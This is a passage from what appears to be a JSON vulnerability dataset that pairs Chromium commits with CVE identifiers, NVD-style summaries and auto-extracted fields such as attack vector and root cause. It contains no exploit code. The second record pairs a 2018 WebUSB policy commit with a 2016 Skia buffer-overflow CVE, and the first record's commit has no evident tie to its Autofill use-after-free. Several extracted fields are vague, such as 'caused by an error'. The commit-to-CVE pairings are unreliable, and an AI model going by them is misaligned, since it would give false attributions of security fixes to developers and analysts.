attacker"},{"commit_id":"9de81f45c73a8f9f215fc234a6adfe087b0eab74","cve_id":"CVE-2016-1690","cwe_id":null,"commit_message":"Remove WeakPtrFactory from PasswordAutofillAgent\n\nUnlike in AutofillAgent, the factory is no longer used in PAA.\n\nR=dvadym@chromium.org\nBUG=609010,609007,608100,608101,433486\n\nReview-Url: https:\/\/codereview.chromium.org\/1945723003\nCr-Commit-Position: refs\/heads\/master@{#391475}","summary":"The Autofill implementation in Google Chrome before 51.0.2704.63 mishandles the interaction between field updates and JavaScript code that triggers a frame deletion, which allows remote attackers to cause a denial of service (use-after-free) or possibly have unspecified other impact via a crafted web site, a different vulnerability than CVE-2016-1701.","commit_message_1":"remove weakptrfactory from passwordautofillagent unlike in autofillagent , the factory is no longer used in paa","Vulnerability Type":"use-after-free","Attack Vector":"via a crafted web site , a different vulnerability than cve - 2016 - 1701","Impact":"cause a denial of service ( use - after - free ) or possibly have unspecified other impact","Root Cause":"caused by a heap use-after-free","Attack Type":"remote attacker"},{"commit_id":"e3aa8a56706c4abe208934d5c294f7b594b8b693","cve_id":"CVE-2016-1691","cwe_id":"CWE-119","commit_message":"Enforce the WebUsbAllowDevicesForUrls policy\n\nThis change modifies UsbChooserContext to use the UsbAllowDevicesForUrls\nclass to consider devices allowed by the WebUsbAllowDevicesForUrls\npolicy. The WebUsbAllowDevicesForUrls policy overrides the other WebUSB\npolicies. Unit tests are also added to ensure that the policy is being\nenforced correctly.\n\nThe design document for this feature is found at:\nhttps:\/\/docs.google.com\/document\/d\/1MPvsrWiVD_jAC8ELyk8njFpy6j1thfVU5aWT3TCWE8w\n\nBug: 854329\nChange-Id: I5f82e662ca9dc544da5918eae766b5535a31296b\nReviewed-on: https:\/\/chromium-review.googlesource.com\/c\/1259289\nCommit-Queue: Ovidio Henriquez <odejesush@chromium.org>\nReviewed-by: Reilly Grant <reillyg@chromium.org>\nReviewed-by: Julian Pastarmov <pastarmovj@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#597926}","summary":"Skia, as used in Google Chrome before 51.0.2704.63, mishandles coincidence runs, which allows remote attackers to cause a denial of service (heap-based buffer overflow) or possibly have unspecified other impact via crafted curves, related to SkOpCoincidence.cpp and SkPathOpsCommon.cpp.","commit_message_1":"enforce the webusballowdevicesforurls policy this change modifies usbchoosercontext to use the usballowdevicesforurls class to consider device allowed by the webusballowdevicesforurls policy","Vulnerability Type":"buffer overflow","Attack Vector":"via crafted curves , related to skopcoincidence . cpp and skpathopscommon . cpp","Impact":"cause a denial of service ( heap - based buffer overflow ) or possibly have unspecified other impact","Root Cause":"caused by an error","Attack Type":"remote attacker"}]